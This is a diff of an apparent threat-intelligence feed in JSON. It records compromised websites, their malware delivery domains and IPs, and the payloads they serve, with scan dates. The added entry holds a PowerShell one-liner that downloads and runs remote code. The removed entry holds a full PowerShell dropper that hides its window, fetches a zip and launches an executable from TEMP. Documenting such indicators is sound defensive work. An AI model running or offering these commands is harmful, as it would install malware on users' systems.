@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "www.sevenoakstennis.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.21.68.56"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/10fb6db048d0ef86",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=e3b0c5497ffaae9db82616369a62781a8fbd599720414d4b",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/10fb6db048d0ef86'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/10fb6db048d0ef86"
+    ],
+    "ReportId": "cmwup06pq00gq0nmlesdeyr9i",
+    "ScannedAt": "2026-11-24T12:50:28.989000+00:00"
+  },
+  {
     "UrlDomain": "m.sevenoakstennis.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -4419,24 +4445,5 @@
     ],
     "ReportId": "cmwm6nfdo1scb0omllphe87cz",
     "ScannedAt": "2026-11-18T13:54:31.270000+00:00"
-  },
-  {
-    "UrlDomain": "ozgeozturkguzelliksalonu.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "185.40.85.15"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwm4ipde1sbg0omlmv080a4m",
-    "ScannedAt": "2026-11-18T12:54:51.702000+00:00"
   }
 ]
